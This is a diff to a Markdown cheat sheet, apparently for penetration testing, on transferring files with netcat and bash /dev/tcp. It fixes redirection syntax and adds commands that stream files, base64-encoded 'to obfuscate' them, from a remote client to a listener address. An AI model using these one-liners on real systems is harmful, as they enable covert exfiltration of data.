@@ -209,7 +209,7 @@ nc -q 0 %ListenerAddress% %ListeningPort% < /path/to/sending/file.ext
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *remote* Linux client connect back with Bash:
 
 ```
-cat /path/to/sending/file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
+cat /path/to/sending/file.ext > /dev/tcp/%ListenerAddress%/%ListenerPort%
 ```
 
 ##### If you want to obfuscate the data being transfered by converting it to a base64 string:
@@ -229,7 +229,7 @@ base64 -w0 /path/to/sending/file.ext | nc -q 0 %ListenerAddress% %ListeningPort%
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *remote* Linux client connect back with Bash:
 
 ```
-base64 -w0 /path/to/sending/file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
+base64 -w0 /path/to/sending/file.ext > /dev/tcp/%ListenerAddress%/%ListenerPort%
 ```
 
 ***
@@ -255,7 +255,7 @@ nc %ListenerAddress% %ListeningPort% > /path/to/store/file.ext
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *local* Linux host connect back with Bash:
 
 ```
-
+cat < /dev/tcp/%ListenerAddress%/%ListenerPort% > /path/to/store/file.ext
 ```
 
 ##### If you want to obfuscate the data being transfered by converting it to a base64 string:
@@ -275,7 +275,7 @@ nc %ListenerAddress% %ListeningPort% | base64 -d > /path/to/store/file.ext
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *local* Linux host connect back with Bash:
 
 ```
-
+cat < /dev/tcp/%ListenerAddress%/%ListenerPort% | base64 -d > /path/to/store/file.ext
 ```
 
 ***
